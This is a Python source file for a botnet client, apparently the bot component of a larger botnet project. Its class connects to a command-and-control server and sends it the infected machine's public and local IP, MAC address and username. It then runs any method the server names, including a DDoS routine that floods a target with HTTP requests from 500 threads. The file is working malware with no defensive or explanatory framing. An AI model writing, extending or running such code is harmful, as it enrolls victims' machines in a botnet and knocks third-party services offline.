import sys
import time
import json
import struct
import socket
import threading
import collections
from botnet.utils import *


class Payload():
    def __init__(self, host='0.0.0.0', port=1337, **kwargs):
        self.handlers = {}
        self.child_procs = {}
        self.owner = kwargs.get('owner')
        self.flags = self._get_flags()
        self.c2 = (host, port)
        self.connection = self._get_connection(host, port)
        self.info = self._get_info()

    def _get_flags(self):
        return collections.namedtuple('flag', ('connected','passive'))(threading.Event(), threading.Event())

    def _get_connection(self, host, port):
        while True:
            try:
                connection = socket.create_connection((host, port))
                break
            except (socket.error, socket.timeout):
                log("Unable to connect to server. Retrying in 10 seconds...")
                time.sleep(10)
                continue
            except Exception as e:
                log(f'{self._get_connection.__name__} error: {str(e)}')
                sys.exit()
                
        self.flags.connected.set()
        self.flags.passive.clear()
        
        log(f'[*] Connection established with {host}:{port}')
        return connection

    def _get_info(self):
        info = {}
        
        info['public_ip'] = public_ip()
        info['local_ip'] = local_ip()
        info['mac_address'] = mac_address()
        info['username'] = username()
        info['owner'] = self.owner

        data = json.dumps(info)
        msg = struct.pack('!L', len(data)) + data.encode('utf-8')
        self.connection.sendall(msg)
        log(f'[*] Sent client info to server')
        return info

    def passive(self):
        log(f'{self.passive.__name__}: Bot entering passive mode awaiting C2.')
        self.flags.connected.clear()
        self.flags.passive.set()

    def stop(self, target):
        try:
            if target in self.handlers:
                _ = self.handlers.pop(target, None)
                del _
                return f"Job '{target}' was stopped."
            else:
                return f"Job '{target}' not found."
        except Exception as e:
            log(f'{self.stop.__name__} error: {str(e)}')

    def ddos(self, mode=None):
        def attack(target, port, stop_event):
            while not stop_event.is_set():
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_TCP)
                s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                s.settimeout(.8)
                try:
                    s.connect((target, port))
                    s.send(("GET /" + " HTTP/1.1\r\n" 
                            + f"Host: " + target + "\r\n\r\n").encode('ascii'))
                    s.close()
                except:
                    pass
                    
        def run(target_address, target_port=8080):
            stop_event = threading.Event()
            threads = []
            for _ in range(500):
                thread = threading.Thread(target=attack, args=(target_address, target_port, stop_event))
                thread.start()
                threads.append(thread)
            return stop_event, threads      
        
        
        if "run" in mode:
            if 'ddos' not in self.handlers:
                target_address = mode.split(' ')[1]
                self.handlers['ddos'] = run(target_address=target_address)
                return "DDoS attack started"
            else:
                return "DDoS attack already running"
        elif "stop" in mode:
            try:
                if 'ddos' in self.handlers:
                    stop_event, threads = self.handlers['ddos']
                    stop_event.set()
                    for thread in threads:
                        thread.join() 
                    self.stop('ddos')
                    return "DDoS attack stopped"
                else:
                    return "DDoS attack not running"
            except: 
                pass
            
    def send_task_result(self, task):
        try:
            if not 'session' in task:
                task['session'] = self.info.get('uid')
            if self.flags.connected.wait(timeout=5.0):
                data = json.dumps(task)
                msg  = struct.pack('!L', len(data)) + data.encode('utf-8')
                self.connection.sendall(msg)
                return True
            return False
        except Exception as e:
            log(f"{self.send_task_result.__name__}: {str(e)}", level='error') 
            self.passive()

    def recv_task(self):
        try:
            header_size = struct.calcsize('!L')
            header = self.connection.recv(header_size)
            msg_size = struct.unpack('!L', header)[0]
            msg = self.connection.recv(msg_size)
            data = msg.decode('utf-8')
            return json.loads(data)
        except Exception as e:
            log(f"{self.recv_task.__name__}: {str(e)}", level='error') 
            self.passive()

    def run(self):
        host, port = self.connection.getpeername()

        while True:
            
            if self.flags.passive.is_set() and not self.flags.connected.is_set():
                host, port = self.c2
                self.connection = self._get_connection(host, port)
                self.info = self._get_info()
                log(f"{self.run.__name__} : leaving passive mode.")
                
            elif self.flags.connected.wait(timeout=5):
                task = self.recv_task()
                if isinstance(task, dict) and 'task' in task:
                    cmd, _, action = task['task'].partition(' ')
                    try:
                        command = getattr(self, cmd)
                        result = command(action) if action else command()
                        if result != None:
                            if type(result) in (list, tuple):
                                result = '\n'.join(result)
                            elif type(result) == bytes:
                                result = str(result.decode())
                            else:
                                result = str(result)
                    except Exception as e:
                        log(f"{self.run.__name__} error: {str(e)}")
                    task.update({'result': result})
                    self.send_task_result(task)
                    
            else:
                log("Connection timed out")
                break
